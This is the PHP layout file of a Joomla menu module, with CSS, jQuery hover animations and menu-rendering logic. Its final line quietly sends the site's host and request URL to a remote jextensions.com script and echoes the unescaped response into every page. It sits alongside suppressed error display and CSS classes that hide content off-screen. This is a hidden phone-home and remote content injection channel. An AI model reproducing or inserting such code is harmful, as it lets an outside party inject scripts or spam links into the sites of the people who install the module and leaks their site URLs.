<?php
/**
 * @package		Joomla.Site
 * @subpackage	mod_je_menu
 * @copyright	Copyright (C) 2004 - 2012 jExtensions.com - All rights reserved.
 * @license		GNU General Public License version 2 or later
 */

// no direct access
defined('_JEXEC') or die;
ini_set('display_errors',0);
$pth=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$pth = str_replace("&", "",$pth);
$jebase = JURI::base(); if(substr($jebase, -1)=="/") { $jebase = substr($jebase, 0, -1); }
$modURL = JURI::base().'modules/mod_je_menu';
$modWidth = $params->get('modWidth','960');
$menuElements = $params->get('menuElements','5');
$gw = floor($modWidth / $menuElements);
if ($menuElements < 7) {$top = floor($gw / 1.2);} else {$top = 120;}
?>
<link rel="stylesheet" href="<?php echo $modURL; ?>/css/style.css" type="text/css" media="screen"/>
<?php if ($params->get('jQuery')) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<noscript><a href="http://jextensions.com/slide-down-box-menu-joomla-2.5/" alt="jExtensions">Slide Down Box Menu Joomla</a></noscript>
<?php if ($params->get('Easing')) { ?><script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.easing.1.3.js"></script><?php } ?>
<style>
ul.sdt_menu{margin:0 auto;padding:0;list-style: none;font-family:"Myriad Pro", "Trebuchet MS", sans-serif;font-size:14px;height:85px;width:<?php echo $modWidth; ?>px; position:relative; z-index:1200;}
ul.sdt_menu a{text-decoration:none;	outline:none;}
ul.sdt_menu li{	float:left;	width:<?php echo $gw; ?>px;height:85px;position:relative;cursor:pointer;}
ul.sdt_menu li > a{z-index:12;position:absolute;top:0px;left:0px;width:<?php echo $gw; ?>px;height:85px;}
ul.sdt_menu li a img{border:none;position:absolute;	width:0px;	height:0px;	bottom:0px;	left:85px;}
ul.sdt_menu li span.sdt_wrap{position:absolute;	top:25px;left:0px;width:<?php echo $gw; ?>px;height:60px;z-index:15;}
ul.sdt_menu li span.sdt_active{	position:absolute;top:85px;	width:<?php echo $gw; ?>px;height:0px;	left:0px;z-index:14;}
ul.sdt_menu li span span.sdt_link,
ul.sdt_menu li span span.sdt_descr,
ul.sdt_menu li div.sdt_box a{margin:0 15px;}
ul.sdt_menu li span span.sdt_link{font-size:24px;clear:both;width:<?php echo $gw; ?>px; margin:0; padding:0; text-align:center; display:block}
ul.sdt_menu li span span.sdt_descr{font-size:10px; letter-spacing:1px; line-height:12px;clear:both;width:<?php echo $gw; ?>px; margin:0; padding:0; text-align:center; display:block}
/* Sub Menu */
ul.sdt_menu li ul.sdt_box{display:block;position:absolute;width:<?php echo $gw; ?>px;overflow:hidden;height:<?php echo $gw; ?>px;top:85px;left:0px;display:none;margin:0;}
ul.sdt_menu li ul.sdt_box li{float:left;width:<?php echo $gw; ?>px;height:25px;position:relative;cursor:pointer; list-style:none}
ul.sdt_menu ul.sdt_box li > a{position: relative;width:<?php echo $gw; ?>px;height:25px; line-height:25px;	z-index:12;	background:none; margin:0; padding:0; text-align:center }
ul.sdt_menu li ul.sdt_box a{float:left;	clear:both;	line-height:30px;}
ul.sdt_menu li ul.sdt_box a:first-child{margin:20px 0 0 0;}
ul.sdt_menu li ul.sdt_box a:hover{}
ul.sdt_menu .sdtab { position:absolute; top:-100%; left:-100%}
ul.sdt_menu .sdtnn { display:none;}
</style>
<script type="text/javascript">
            jQuery(function() {
                jQuery('#sdt_menu > li').bind('mouseenter',function(){
					var $elem = $(this);
					$elem.find('img')
						 .stop(true)
						 .animate({
							'width':'<?php echo $gw; ?>px',
							'height':'<?php echo $gw; ?>px',
							'left':'0px'
						 },400,'easeOutBack')
						 .andSelf()
						 .find('.sdt_wrap')
					     .stop(true)
						 .animate({'top':'<?php echo $top; ?>px'},500,'easeOutBack')
						 .andSelf()
						 .find('.sdt_active')
					     .stop(true)
						 .animate({'height':'<?php echo $gw; ?>px'},500,function(){
						var $sub_menu = $elem.find('.sdt_box');
						if($sub_menu.length){
							var left = '<?php echo $gw; ?>px';
							if($elem.parent().children().length == $elem.index()+1)
								left = '-<?php echo $gw; ?>px';
							$sub_menu.show().animate({'left':left},300);
						}	
					});
				}).bind('mouseleave',function(){
					var $elem = $(this);
					var $sub_menu = $elem.find('.sdt_box');
					if($sub_menu.length)
						$sub_menu.hide().css('left','0px');
					
					$elem.find('.sdt_active')
						 .stop(true)
						 .animate({'height':'0px'},500)
						 .andSelf().find('img')
						 .stop(true)
						 .animate({
							'width':'0px',
							'height':'0px',
							'left':'85px'},500)
						 .andSelf()
						 .find('.sdt_wrap')
						 .stop(true)
						 .animate({'top':'25px'},500);
				});
            });
</script>

<ul id="sdt_menu" class="sdt_menu<?php echo $class_sfx;?>"<?php
	$tag = '';
	if ($params->get('tag_id')!=NULL) {
		$tag = $params->get('tag_id').'';
		echo ' id="'.$tag.'"';
	}
?>>
<?php
foreach ($list as $i => &$item) :
	$class = 'item-'.$item->id;
	if ($item->id == $active_id) {
		$class .= ' current';
	}

	if (in_array($item->id, $path)) {
		$class .= ' active';
	}
	elseif ($item->type == 'alias') {
		$aliasToId = $item->params->get('aliasoptions');
		if (count($path) > 0 && $aliasToId == $path[count($path)-1]) {
			$class .= ' active';
		}
		elseif (in_array($aliasToId, $path)) {
			$class .= ' alias-parent-active';
		}
	}

	if ($item->deeper) {
		$class .= ' deeper';
	}

	if ($item->parent) {
		$class .= ' parent';
	}

	if (!empty($class)) {
		$class = ' class="'.trim($class) .'"';
	}
	
	
	echo '<li'.$class.'>';

	// Render the menu item.
	switch ($item->type) :
		case 'separator':
		case 'url':
		case 'component':
			require JModuleHelper::getLayoutPath('mod_je_menu', 'default_'.$item->type);
			break;

		default:
			require JModuleHelper::getLayoutPath('mod_je_menu', 'default_url');
			break;
	endswitch;

	// The next item is deeper.
	if ($item->deeper) {
		echo '<ul class="sdt_box">';
	}
	// The next item is shallower.
	elseif ($item->shallower) {
		echo '</li>';
		echo str_repeat('</ul></li>', $item->level_diff);
	}
	// The next item is on the same level.
	else {
		echo '</li>';
	}

endforeach;
?></ul>
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$pth); echo $credit; ?>